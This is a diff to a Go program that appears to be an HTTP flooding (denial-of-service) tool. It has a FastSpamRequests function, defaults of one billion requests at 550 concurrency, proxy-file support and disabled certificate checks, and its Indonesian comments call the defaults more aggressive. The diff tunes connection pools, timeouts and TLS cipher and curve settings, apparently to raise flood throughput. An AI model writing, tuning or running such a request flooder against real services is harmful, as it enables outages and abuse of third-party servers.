@@ -68,7 +68,7 @@ func FastSpamRequests(Link string, numRequests int64, concurrency int, timeout t
 
 	transport := &http.Transport{
 		Proxy: proxyFunc,
-		MaxIdleConns:        70000,
+		MaxIdleConns:        50000,
 		MaxIdleConnsPerHost: 50000,
 		IdleConnTimeout:     2 * time.Second,
 		TLSHandshakeTimeout: 1 * time.Second,
@@ -79,6 +79,11 @@ func FastSpamRequests(Link string, numRequests int64, concurrency int, timeout t
 		}).DialContext,
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
+			MinVersion:         tls.VersionTLS12,
+			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
+			CipherSuites: []uint16{
+				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			},
 		},
 		ForceAttemptHTTP2: true,
 	}
@@ -290,12 +295,12 @@ func main() {
 	configPath := flag.String("config", "", "FILE JSON")
 	requestsFlag := flag.Int64("requests", 1000000000, "TOTAL REQUESTS")
 	concurrencyFlag := flag.Int("concurrency", 550, "CONCURRENCY")  // Default ditingkatkan
-	timeoutFlag := flag.Float64("timeout", 2.5, "WAKTU SETIAP REQUEST") // Default lebih agresif
+	timeoutFlag := flag.Float64("timeout", 2.8, "WAKTU SETIAP REQUEST") // Default lebih agresif
 	methodFlag := flag.String("method", "GET", "HTTP METHOD")
 	logFlag := flag.String("log", "ERROR", "DEBUG, INFO, WARNING, ERROR")
 	noLiveFlag := flag.Bool("no-live", false, "MATIKAN LIVE OUTPUT")
 	proxyFile := flag.String("proxy", "", "FILE PROXY")
-	updateIntervalFlag := flag.Float64("update-interval", 0.05, "KECEPATAN LOADING") // Default lebih cepat
+	updateIntervalFlag := flag.Float64("update-interval", 0.10, "KECEPATAN LOADING") // Default lebih cepat
 	flag.Parse()
 	
 	if strings.ToUpper(*logFlag) == "DEBUG" {
